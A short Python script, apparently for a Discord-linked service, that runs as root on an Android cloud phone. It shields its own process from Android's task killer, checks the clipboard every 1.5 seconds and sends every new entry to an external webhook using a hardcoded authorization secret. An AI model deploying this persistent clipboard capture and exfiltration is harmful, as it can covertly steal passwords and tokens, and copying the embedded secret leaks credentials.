import sys
import time
import subprocess
import requests
import os

if len(sys.argv) < 3:
    sys.exit(1)

device_id = sys.argv[1]
guild_id = sys.argv[2]
URL_WEBHOOK = "https://hapiephoneugph.vercel.app/api/webhook"
AUTH_SECRET = "ugphoneoficialbrasil13willianz4z4oof$$$pitucho13"

# Blinda o processo fantasma contra o "Assassino de Tarefas" do Android
try:
    pid = os.getpid()
    subprocess.run(f'su -c "echo -1000 > /proc/{pid}/oom_score_adj"', shell=True)
except:
    pass

def get_clipboard():
    try:
        # Acorda o Clipboard do Android à força via Root (Bypass do Ugphone)
        subprocess.run('su -c "am broadcast -a com.termux.api.clipboard.get"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Extrai o texto
        out = subprocess.check_output('termux-clipboard-get', shell=True, stderr=subprocess.DEVNULL).decode('utf-8').strip()
        return out
    except:
        return ""

last_clipboard = get_clipboard()

while True:
    try:
        current_clipboard = get_clipboard()
        
        if current_clipboard and current_clipboard != last_clipboard:
            payload = {"texto": current_clipboard, "device_id": device_id, "guild_id": guild_id}
            headers = {"Content-Type": "application/json", "Authorization": AUTH_SECRET}
            
            resp = requests.post(URL_WEBHOOK, json=payload, headers=headers, timeout=5)
            if resp.status_code == 200:
                last_clipboard = current_clipboard
    except:
        pass
        
    time.sleep(1.5)
